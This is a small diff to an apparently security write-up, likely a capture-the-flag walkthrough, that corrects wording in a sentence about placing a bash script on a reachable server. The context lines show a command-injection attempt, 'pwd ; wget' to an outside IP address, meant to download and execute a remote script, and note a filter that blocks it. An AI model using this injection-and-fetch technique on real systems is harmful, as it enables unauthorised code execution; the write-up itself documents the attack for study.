@@ -162,9 +162,9 @@ index.html: HTML document, ASCII text, with very long lines
 index.html: line 1: syntax error near unexpected token `<'   <-- Expected, since it's just HTML right now
 ```
 
-Great, downloading and executing a file looks like it will work. Now we just to
-need put a bash script on a server that can be reached from the shell. However,
-when I tried to few different servers, I got this:
+Great, downloading and executing a file looks like it will work. Now we just
+need to put a bash script on a server that can be reached from the shell.
+However, when I tried to few different servers, I got this:
 ```
 > pwd ; wget 12.345.67.89
 > bad command: pwd ; wget 12.345.67.89       <-- Multiple periods in one command not allowed
